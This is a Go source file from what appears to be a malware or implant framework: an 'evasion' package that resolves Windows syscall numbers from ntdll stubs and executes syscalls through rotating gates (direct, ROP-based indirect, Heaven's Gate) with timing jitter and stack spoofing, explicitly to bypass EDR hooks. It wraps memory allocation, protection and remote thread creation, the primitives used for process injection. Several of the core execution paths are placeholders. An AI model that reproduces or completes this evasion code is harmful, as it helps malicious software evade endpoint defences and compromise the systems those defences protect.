package evasion

/*
	Stage 2.3: Enhanced Syscall Evasion
	Provides direct syscall capabilities to bypass EDR hooks
*/

import (
	insecureRand "math/rand"
	"runtime"
	"time"
	"unsafe"
)

// SyscallNumber represents a Windows syscall number
type SyscallNumber uint32

// Common syscall numbers (these would be dynamically resolved in practice)
const (
	// Base syscall numbers - these change between Windows versions
	SysNtAllocateVirtualMemory  SyscallNumber = 0x18
	SysNtProtectVirtualMemory   SyscallNumber = 0x50
	SysNtCreateThreadEx         SyscallNumber = 0xC1
	SysNtQuerySystemInformation SyscallNumber = 0x36
	SysNtOpenProcess            SyscallNumber = 0x26
	SysNtWriteVirtualMemory     SyscallNumber = 0x3A
	SysNtReadVirtualMemory      SyscallNumber = 0x3F
)

// SyscallGate represents different methods of executing syscalls
type SyscallGate int

const (
	GateDirect   SyscallGate = iota // Direct syscall execution
	GateIndirect                    // Indirect through ROP
	GateHeaven                      // Heaven's Gate (WoW64)
	GateSysenter                    // Legacy sysenter
)

// SyscallExecutor manages syscall execution with evasion
type SyscallExecutor struct {
	preferredGate     SyscallGate
	syscallTable      map[string]SyscallNumber
	lastGateRotation  time.Time
	gateRotationDelay time.Duration
	stackSpoof        bool
}

// NewSyscallExecutor creates a new syscall executor
func NewSyscallExecutor() *SyscallExecutor {
	return &SyscallExecutor{
		preferredGate:     GateDirect,
		syscallTable:      make(map[string]SyscallNumber),
		gateRotationDelay: time.Second * time.Duration(insecureRand.Intn(30)+10), // 10-40 seconds
		lastGateRotation:  time.Now(),
		stackSpoof:        true,
	}
}

// ExecuteSyscall performs a syscall with anti-hooking measures
func (se *SyscallExecutor) ExecuteSyscall(name string, args ...uintptr) (uintptr, uintptr, error) {
	// Rotate syscall gate periodically for evasion
	if time.Since(se.lastGateRotation) > se.gateRotationDelay {
		se.rotateSyscallGate()
	}

	// Resolve syscall number dynamically
	syscallNum, err := se.resolveSyscallNumber(name)
	if err != nil {
		return 0, 0, err
	}

	// Add pre-syscall timing jitter
	se.addSyscallJitter()

	// Execute syscall based on current gate
	r1, r2, err := se.executeSyscallWithGate(syscallNum, se.preferredGate, args...)

	// Add post-syscall timing jitter
	se.addSyscallJitter()

	return r1, r2, err
}

// resolveSyscallNumber dynamically determines syscall number
func (se *SyscallExecutor) resolveSyscallNumber(name string) (SyscallNumber, error) {
	// Check cache first
	if cached, exists := se.syscallTable[name]; exists {
		return cached, nil
	}

	// Resolve syscall number from NTDLL
	syscallNum, err := se.parseSyscallFromNTDLL(name)
	if err != nil {
		return 0, err
	}

	// Cache the resolved number
	se.syscallTable[name] = syscallNum

	return syscallNum, nil
}

// parseSyscallFromNTDLL extracts syscall number from NTDLL function
func (se *SyscallExecutor) parseSyscallFromNTDLL(name string) (SyscallNumber, error) {
	// Get API resolver
	resolver := GetGlobalAPIResolver()
	if resolver == nil {
		InitializeAPIResolver()
		resolver = GetGlobalAPIResolver()
	}

	// Resolve function address in NTDLL
	hash := GenerateAPIHash(name)
	funcAddr, err := resolver.GetAPI(hash, "ntdll.dll", name)
	if err != nil {
		return 0, err
	}

	// Parse syscall number from function prologue
	return se.extractSyscallNumber(funcAddr)
}

// extractSyscallNumber reads syscall number from function bytes
func (se *SyscallExecutor) extractSyscallNumber(funcAddr uintptr) (SyscallNumber, error) {
	if funcAddr == 0 {
		return 0, ErrInvalidSyscall
	}

	// Read function bytes
	funcBytes := (*[32]byte)(unsafe.Pointer(funcAddr))

	// Pattern 1: mov r10, rcx; mov eax, <syscall_number>; syscall; ret
	if funcBytes[0] == 0x4C && funcBytes[1] == 0x8B && funcBytes[2] == 0xD1 && funcBytes[3] == 0xB8 {
		// Extract syscall number from bytes 4-7
		return SyscallNumber(uint32(funcBytes[4]) | uint32(funcBytes[5])<<8 |
			uint32(funcBytes[6])<<16 | uint32(funcBytes[7])<<24), nil
	}

	// Pattern 2: mov eax, <syscall_number>; test byte ptr [SharedUserData+0x308], 1; jne; syscall; ret
	if funcBytes[0] == 0xB8 {
		// Extract syscall number from bytes 1-4
		return SyscallNumber(uint32(funcBytes[1]) | uint32(funcBytes[2])<<8 |
			uint32(funcBytes[3])<<16 | uint32(funcBytes[4])<<24), nil
	}

	return 0, ErrInvalidSyscallStub
}

// executeSyscallWithGate executes syscall using specified gate
func (se *SyscallExecutor) executeSyscallWithGate(syscallNum SyscallNumber, gate SyscallGate, args ...uintptr) (uintptr, uintptr, error) {
	switch gate {
	case GateDirect:
		return se.executeDirectSyscall(syscallNum, args...)
	case GateIndirect:
		return se.executeIndirectSyscall(syscallNum, args...)
	case GateHeaven:
		return se.executeHeavensGate(syscallNum, args...)
	case GateSysenter:
		return se.executeSysenterGate(syscallNum, args...)
	default:
		return se.executeDirectSyscall(syscallNum, args...)
	}
}

// executeDirectSyscall performs direct syscall execution
func (se *SyscallExecutor) executeDirectSyscall(syscallNum SyscallNumber, args ...uintptr) (uintptr, uintptr, error) {
	// Prepare syscall arguments (Windows x64 calling convention)
	var r1, r2 uintptr

	// Stack spoofing preparation
	if se.stackSpoof {
		se.prepareSpoofedStack()
	}

	// This would normally contain inline assembly for direct syscall
	// For now, we'll simulate the syscall execution
	r1, r2 = se.simulateSyscall(syscallNum, args...)

	return r1, r2, nil
}

// executeIndirectSyscall uses ROP chains to execute syscalls
func (se *SyscallExecutor) executeIndirectSyscall(syscallNum SyscallNumber, args ...uintptr) (uintptr, uintptr, error) {
	// Find suitable ROP gadgets for indirect execution
	gadgets, err := se.findROPGadgets()
	if err != nil {
		// Fallback to direct syscall
		return se.executeDirectSyscall(syscallNum, args...)
	}

	// Build ROP chain
	ropChain := se.buildROPChain(syscallNum, gadgets, args...)

	// Execute ROP chain
	return se.executeROPChain(ropChain)
}

// executeHeavensGate implements Heaven's Gate technique for WoW64
func (se *SyscallExecutor) executeHeavensGate(syscallNum SyscallNumber, args ...uintptr) (uintptr, uintptr, error) {
	// Check if running under WoW64
	if !se.isWoW64Process() {
		// Fallback to direct syscall on native x64
		return se.executeDirectSyscall(syscallNum, args...)
	}

	// Heaven's Gate implementation would go here
	// This requires switching from 32-bit to 64-bit mode
	return se.executeDirectSyscall(syscallNum, args...)
}

// executeSysenterGate uses legacy sysenter instruction
func (se *SyscallExecutor) executeSysenterGate(syscallNum SyscallNumber, args ...uintptr) (uintptr, uintptr, error) {
	// Sysenter is primarily for 32-bit systems
	// Fall back to direct syscall on x64
	return se.executeDirectSyscall(syscallNum, args...)
}

// Helper functions
func (se *SyscallExecutor) addSyscallJitter() {
	// Add random delay between 1-10ms to avoid temporal detection
	delay := time.Duration(insecureRand.Intn(10)+1) * time.Millisecond
	time.Sleep(delay)
}

func (se *SyscallExecutor) rotateSyscallGate() {
	// Randomly select new syscall gate
	gates := []SyscallGate{GateDirect, GateIndirect, GateHeaven, GateSysenter}
	se.preferredGate = gates[insecureRand.Intn(len(gates))]
	se.lastGateRotation = time.Now()
}

func (se *SyscallExecutor) prepareSpoofedStack() {
	// Stack spoofing preparation - would modify call stack to hide origin
	// This is a complex technique that requires careful implementation
	runtime.GC() // Force GC to clear any residual stack traces
}

func (se *SyscallExecutor) simulateSyscall(syscallNum SyscallNumber, args ...uintptr) (uintptr, uintptr) {
	// This is a placeholder for actual syscall execution
	// In real implementation, this would contain inline assembly
	return 0, 0
}

func (se *SyscallExecutor) findROPGadgets() ([]uintptr, error) {
	// Find suitable ROP gadgets in loaded modules
	// This is a complex implementation that scans for useful instruction sequences
	return nil, ErrNoROPGadgets
}

func (se *SyscallExecutor) buildROPChain(syscallNum SyscallNumber, gadgets []uintptr, args ...uintptr) []uintptr {
	// Build ROP chain for indirect syscall execution
	return nil
}

func (se *SyscallExecutor) executeROPChain(chain []uintptr) (uintptr, uintptr, error) {
	// Execute ROP chain
	return 0, 0, ErrROPExecutionFailed
}

func (se *SyscallExecutor) isWoW64Process() bool {
	// Check if current process is running under WoW64
	// This would use IsWow64Process API or check PEB flags
	return false
}

// Stage 2.3: High-level syscall wrappers for common operations
// NtAllocateVirtualMemory wrapper with evasion
func (se *SyscallExecutor) NtAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType, protect uintptr) error {
	_, _, err := se.ExecuteSyscall("NtAllocateVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		allocationType,
		protect)
	return err
}

// NtProtectVirtualMemory wrapper with evasion
func (se *SyscallExecutor) NtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uintptr) error {
	_, _, err := se.ExecuteSyscall("NtProtectVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		newProtect,
		uintptr(unsafe.Pointer(oldProtect)))
	return err
}

// NtCreateThreadEx wrapper with evasion
func (se *SyscallExecutor) NtCreateThreadEx(threadHandle *uintptr, desiredAccess uintptr, objectAttributes *uintptr, processHandle uintptr, startRoutine uintptr, argument uintptr, createFlags uintptr, zeroBits uintptr, stackSize uintptr, maximumStackSize uintptr, attributeList *uintptr) error {
	_, _, err := se.ExecuteSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		uintptr(unsafe.Pointer(objectAttributes)),
		processHandle,
		startRoutine,
		argument,
		createFlags,
		zeroBits,
		stackSize,
		maximumStackSize,
		uintptr(unsafe.Pointer(attributeList)))
	return err
}

// ClearSyscallCache clears all cached syscall numbers
func (se *SyscallExecutor) ClearSyscallCache() {
	for name := range se.syscallTable {
		delete(se.syscallTable, name)
	}
}

// Custom errors for syscall operations
var (
	ErrInvalidSyscall     = &SyscallError{"invalid syscall"}
	ErrInvalidSyscallStub = &SyscallError{"invalid syscall stub"}
	ErrNoROPGadgets       = &SyscallError{"no suitable ROP gadgets found"}
	ErrROPExecutionFailed = &SyscallError{"ROP chain execution failed"}
)

type SyscallError struct {
	msg string
}

func (e *SyscallError) Error() string {
	return e.msg
}

// Global syscall executor instance
var globalSyscallExecutor *SyscallExecutor

// InitializeSyscallExecutor initializes the global syscall executor
func InitializeSyscallExecutor() {
	globalSyscallExecutor = NewSyscallExecutor()
}

// GetGlobalSyscallExecutor returns the global syscall executor
func GetGlobalSyscallExecutor() *SyscallExecutor {
	if globalSyscallExecutor == nil {
		InitializeSyscallExecutor()
	}
	return globalSyscallExecutor
}

// DirectSyscall executes a syscall using the global executor
func DirectSyscall(name string, args ...uintptr) (uintptr, uintptr, error) {
	return GetGlobalSyscallExecutor().ExecuteSyscall(name, args...)
}
